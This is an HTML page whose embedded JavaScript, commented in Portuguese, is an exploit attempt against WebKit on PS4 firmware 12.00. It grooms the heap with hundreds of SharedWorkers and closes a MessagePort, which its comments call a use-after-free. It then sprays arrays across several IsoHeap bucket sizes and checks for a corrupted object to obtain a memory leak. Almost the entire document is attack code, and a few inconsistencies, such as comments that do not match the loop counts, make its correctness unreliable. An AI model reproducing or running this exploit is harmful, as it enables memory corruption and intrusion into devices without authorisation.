<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 ISOHEAP BREAKER</title>
    
</head>
<body>

    <h1>ISOHEAP BREAKER</h1>
    <h3>Estratégia: Poluição de Heap Múltipla</h3>
    <div id="status">Aguardando...</div>
    <div id="log"></div>
    
    <button onclick="run_breaker()">INICIAR QUEBRA</button>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. MULTI-PAYLOADS (Vários Tamanhos)
        // =================================================================
        // O bmalloc alinha em 16 bytes. Vamos criar payloads para todas as classes prováveis.
        
        function get_payload(size) {
            // Cria um Double Array que ocupe exatamente 'size' bytes na memória
            // Header do Array ~= 16 bytes
            var elements = (size - 16) / 8;
            var arr = new Array(Math.floor(elements));
            for(var i=0; i<arr.length; i++) arr[i] = 1.1; // Marker 0x3FF1...
            return arr;
        }

        // Tamanhos de balde do WebKit (IsoHeap Buckets)
        var BUCKETS = [
            0x80, 0x90, 0xA0, 0xB0, 
            0xC0, 0xD0, 0xE0, 0xF0, 
            0x100, 0x120, 0x140
        ];

        var workers = [];

        async function run_breaker() {
            if(!window.SharedWorker) return log("Erro: Navegador.");

            log(">>> INICIANDO ATAQUE MULTI-BUCKET <<<");
            
            // 1. PREPARAÇÃO: Criar "lixo" em todos os tamanhos
            // Para "aquecer" os alocadores de todos os tamanhos
            log("Aquecendo alocadores...");
            var trash = [];
            for(let s of BUCKETS) {
                for(let k=0; k<100; k++) trash.push(get_payload(s));
            }
            
            // 2. GROOMING (400)
            log("Grooming (400)...");
            for(let i=0; i<400; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 3. TRIGGER (403 -> 405)
            var p_count = 0;
            var limit = 405 - 400; // Vamos ser agressivos

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    // Vítima Final
                    var v = workers.pop();
                    var p = v.port;
                    v.port.close(); // UAF
                    
                    // 4. SPRAY "METRALHADORA"
                    // Em vez de sprayar só um tamanho, sprayamos TODOS ao mesmo tempo.
                    // Um deles tem que encaixar no buraco.
                    log("DISPARANDO SPRAY MÚLTIPLO...");
                    
                    var spray_matrix = [];
                    // Fazemos 5000 cópias de CADA tamanho possível
                    // Isso vai consumir uns 100MB de RAM (seguro)
                    for(let s of BUCKETS) {
                        var pload = get_payload(s);
                        for(let k=0; k<2000; k++) {
                            // Usamos slice para clonar rápido
                            spray_matrix.push(pload.slice(0));
                        }
                    }

                    // 5. CHECK
                    setTimeout(() => {
                        try {
                            var s = p.toString();
                            if (s.indexOf("MessagePort") === -1) {
                                log("!!! SUCESSO !!!", "#0f0");
                                log("Objeto Corrompido: " + s, "#0f0");
                                alert("LEAK OBTIDO! O IsoHeap foi quebrado.");
                            } else {
                                log("Falha: Objeto intacto.");
                                // Tenta forçar erro
                                try { let x = p.onmessage; } catch(e) {
                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO!");
                                }
                            }
                        } catch(e) {
                            log("Erro na leitura: " + e);
                        }
                        
                        // Limpeza
                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
                        trash = null;
                        spray_matrix = null;
                        
                    }, 1000);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                p_count++;
            }, 100);
        }
    </script>
</body>
</html>
